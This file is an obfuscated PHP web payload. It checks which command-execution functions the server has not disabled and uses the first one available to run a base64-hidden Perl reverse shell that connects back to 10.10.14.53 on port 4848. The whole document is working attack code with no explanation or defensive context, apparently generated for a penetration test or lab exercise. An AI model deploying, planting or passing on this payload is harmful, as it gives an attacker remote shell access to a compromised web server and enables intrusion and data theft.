/*<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $TipfFR=@ini_get('disable_functions');
      if(!empty($TipfFR)){
        $TipfFR=preg_replace('/[, ]+/', ',', $TipfFR);
        $TipfFR=explode(',', $TipfFR);
        $TipfFR=array_map('trim', $TipfFR);
      }else{
        $TipfFR=array();
      }
      $c = base64_decode('cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC41Mzo0ODQ4Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==');
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $PxUmjG='is_callable';
      $AYNn='in_array';
      
      if($PxUmjG('exec')and!$AYNn('exec',$TipfFR)){
        $eBPzV=array();
        exec($c,$eBPzV);
        $eBPzV=join(chr(10),$eBPzV).chr(10);
      }else
      if($PxUmjG('popen')and!$AYNn('popen',$TipfFR)){
        $fp=popen($c,'r');
        $eBPzV=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $eBPzV.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($PxUmjG('shell_exec')and!$AYNn('shell_exec',$TipfFR)){
        $eBPzV=shell_exec($c);
      }else
      if($PxUmjG('system')and!$AYNn('system',$TipfFR)){
        ob_start();
        system($c);
        $eBPzV=ob_get_contents();
        ob_end_clean();
      }else
      if($PxUmjG('proc_open')and!$AYNn('proc_open',$TipfFR)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $eBPzV=NULL;
        while(!feof($pipes[1])){
          $eBPzV.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($PxUmjG('passthru')and!$AYNn('passthru',$TipfFR)){
        ob_start();
        passthru($c);
        $eBPzV=ob_get_contents();
        ob_end_clean();
      }else
      {
        $eBPzV=0;
      }
    